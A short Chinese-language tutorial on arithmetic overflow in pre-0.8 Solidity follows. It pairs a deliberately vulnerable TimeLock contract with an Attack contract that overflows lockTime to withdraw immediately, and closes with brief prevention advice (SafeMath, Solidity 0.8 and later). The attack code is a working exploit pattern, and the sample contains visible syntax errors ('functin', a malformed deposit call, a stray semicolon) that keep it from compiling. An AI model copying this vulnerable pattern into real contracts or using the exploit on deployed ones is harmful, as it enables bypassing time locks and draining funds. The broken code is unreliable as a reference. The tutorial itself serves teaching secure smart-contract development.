# 算术溢出漏洞

在 solidity < 0.8, 整数溢出/下溢是没有任何错误的;

在 solidity >= 0.8, 整数溢出/下溢是会抛出错误的。

也就是说，在 >= 0.8版本下修复了溢出漏洞。

### 漏洞示例
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// 合约的设计目的是 时间保险
// 用户可以向合约存入eth, 但是一周之内是不能够提取
// 用户可以延长一周的等待期

/*
1. 部署 TimeLock 合约
2. 使用 TimeLock 地址 部署 攻击合约
3. 调用攻击，发送 1 eth。 我们可以立刻提取 ether

发生了什么？
	因为 TimeLock.LockTime 溢出 导致可以立刻提取，而不用等待一周
*/

contract TimeLock {
	mapping(address => uint) public balances;
	mapping(address => uint) public lockTime;
	
	functin deposit() external payable {
		balances[msg.sender] += msg.value;
		lockTime[msg.sender] = block.timestamp + 1 weeks;
	}
	
	function increaseLockTime(uint _secondsToIncrease) public {
		lockTime[msg.sender] += _secondsToIncrease;
	}
	
	function withdraw() public {
		require(balances[msg.sender] > 0, "Insufficient funds");
		require(block.timestamp > lockTime[msg.sender], "lock time not expired");
		
		uint amount = balances[msg.sender];
		balances[msg.sender] = 0;
		
		(bool sent, ) = msg.sender.call{value: amount}("");
		require(sent, "Failed to send Ether");
	}
}

contract Attack {
	TimeLock timeLock;
	
	constructor(TimeLock _timeLock){
		timeLock = TimeLock(_timeLock);
	};
	
	fallback() external payable{}

	function attack() public payable {
		timeLock.deposit{}(value: msg.value);
	     /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
		timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));
		
		timeLock.withdraw();
	}
}
```

### 预防技术

- 使用 `SafeMath` 防止算术溢出
- 使用 >=0.8 的版本会抛出 error

